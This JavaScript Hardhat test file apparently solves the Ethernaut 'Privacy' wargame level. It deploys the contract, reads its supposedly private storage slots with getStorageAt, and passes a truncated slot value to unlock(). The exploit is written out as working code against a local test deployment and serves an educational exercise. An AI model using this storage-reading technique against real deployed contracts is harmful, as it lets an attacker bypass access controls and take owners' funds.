const { ethers, deployments, getNamedAccounts, waffle } = require("hardhat")
const { deploy } = deployments
const { assert, expect } = require("chai")

describe("King Test", () => {
    let privacy, deployer, player, attacker, provider,constructorArgs
    beforeEach(async () => {
        provider = waffle.provider
        deployer = (await getNamedAccounts()).deployer
        const accounts = await ethers.getSigners()
        attacker = accounts[1]
        constructorArgs = [
            "0x63616e6469646174653100000000000000000000000000000000000000000000",
            "0x6332000000000000000000000000000000000000000000000000000000000000",
            "0x6333000000000000000000000000000000000000000000000000000000000000",
        ]
        await deploy("Privacy", {
            from: deployer,
            args: [constructorArgs],
        })
        privacy = await ethers.getContract("Privacy")
    })
    describe("Check initiallization", () => {
        it("Check if locked is true", async () => {
            const isLocked = await privacy.locked()
            assert(isLocked)
        })
    })
    describe("Let's attack ", () => {
        let pass = []
        it("Get the password", async () => {
            for (var i = 3; i < 6; i++) {
                const password = (await provider.getStorageAt(privacy.address, i)).toString()
                pass.push(password)
            }
            console.log(pass)
            assert.equal(pass.toString(),constructorArgs.toString())
        })
        
        it("Let's  Unlock", async()=>{
            const storeSlot2 = pass[2]
            const realPassword = storeSlot2.slice(0,34)
            await privacy.unlock(realPassword)
            const isLocked = await privacy.locked()
            assert(!isLocked)
        })
    })
})